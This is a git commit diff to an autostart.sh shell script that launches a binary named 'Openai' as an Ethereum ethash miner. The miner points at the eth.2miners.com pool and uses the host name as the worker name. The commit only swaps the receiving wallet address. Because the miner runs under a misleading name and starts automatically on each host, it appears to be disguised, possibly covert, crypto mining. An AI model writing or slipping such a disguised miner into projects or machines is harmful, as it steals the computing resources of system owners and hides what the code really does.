b14ac8b7e571649de698e72c1c07c27f67707788
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-01-15 15:22:05 +0700

    Update autostart.sh

--- autostart.sh
+++ autostart.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 
-./Openai --algo ethash --server eth.2miners.com:2020 --user 0x406cc90e0a558e247a539e685e02ad8cb22f91c8.$HOSTNAME
+./Openai --algo ethash --server eth.2miners.com:2020 --user 0x2fd9EB3c66C491443C09d9F10634602C909992Dd.$HOSTNAME
